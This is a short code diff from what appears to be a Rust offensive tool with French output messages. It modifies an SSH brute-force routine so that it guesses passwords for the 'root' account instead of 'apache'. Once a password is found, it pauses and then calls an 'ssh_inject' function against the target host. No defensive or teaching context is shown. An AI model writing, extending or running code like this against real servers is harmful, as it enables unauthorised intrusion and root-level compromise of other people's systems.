@@ -86,7 +86,9 @@ pub(crate) async fn ssh_bruteforce(ip_address: &str, file_path: &str) {
         Ok(password) => {
             println!("Mot de passe trouvé : {}", password);
 
-            ssh_inject(ip_address, "apache".to_string(), password);
+            tokio::time::sleep(Duration::from_secs(4)).await;
+
+            ssh_inject(ip_address, "root".to_string(), password);
         }
         Err(_) => {
             println!("Aucun mot de passe trouvé.");
@@ -115,7 +117,7 @@ fn try_login(ip_address: &str, password: &str) -> bool {
                 sess.set_timeout(timeout_ms);
 
                 // Attempt to authenticate with the given password
-                if sess.userauth_password("apache", password).is_ok() {
+                if sess.userauth_password("root", password).is_ok() {
                     return true;
                 }
                 drop(sess);
